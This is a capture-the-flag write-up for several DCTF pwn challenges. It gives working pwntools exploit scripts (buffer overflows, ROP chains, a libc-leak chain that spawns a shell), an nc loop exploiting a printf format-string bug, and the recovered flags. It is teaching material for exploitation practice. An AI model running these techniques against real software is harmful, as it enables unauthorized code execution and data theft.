# ***PWN_SANITY_CHECK***

```py
from pwn import *

binary = context.binary = ELF('./pwn_sanity_check')
p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))

payload  = b''
payload += b'A' * 72
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi_r15)
payload += p64(0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.win)

p.sendlineafter('joke\n',payload)
p.interactive()
```
FLAG: ***``dctf{Ju5t_m0v3_0n}``***

# ***PINCH_ME***

```py
from pwn import *

binary = context.binary = ELF('./pinch_me')
p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

payload  = b''
payload += b'A' * 24
payload += p64(0x1337c0de)

p.sendlineafter('?\n',payload)
p.interactive()
```
FLAG : `***`dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}``***

# ***README***

The vuln function reads flag.txt into a local (local_58) stack array.

The vulnerability is the printf(local_38) statement that is missing a format string. Exfiltrating the flag is as simple as passing %nn$p format strings where nn is the position in the stack; starting from 6 just increment until the output starts with dctf (nn = 8), then continue until you have the flag.

```c
for((p=8;p<14;p++)) {
    echo '%'$p'$p' | \
    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
    grep 'hello ' | \
    awk -Fx '{print $NF}' | \
    xxd -r -p | \
    rev
}
```

This bash script will echo %8$p, then echo %9$p, etc... into the challenge service serially (one by one), capturing the output (grep, awk), converting to text (xxd), and then finally reversing the string (rev, since x86_64 is little endian).

```
dctf{n0w_g0_r3ad_s0me_b0rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
```
By guessing the last letters as `0k5`.

FLAG : ***```dctf{n0w_g0_r3ad_s0me_b00k5}```***

# ***MAGIC_TRICK***

```py
from pwn import *

binary = context.binary = ELF('./magic_trick')

p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

p.sendlineafter('write\n', str(binary.sym.win))
p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
print(p.recvuntil('}').decode())
```

FLAG : ***```dctf{1_L1k3_M4G1c}```***

# ***BABY_BOF***

```py
from pwn import *

binary = context.binary = ELF('./baby_bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x12 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')

puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x12 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')
p.interactive()
```
#here[https://github.com/datajerk/ctf-write-ups/blob/master/INDEX.md ]

similiar : https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/roprop https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what
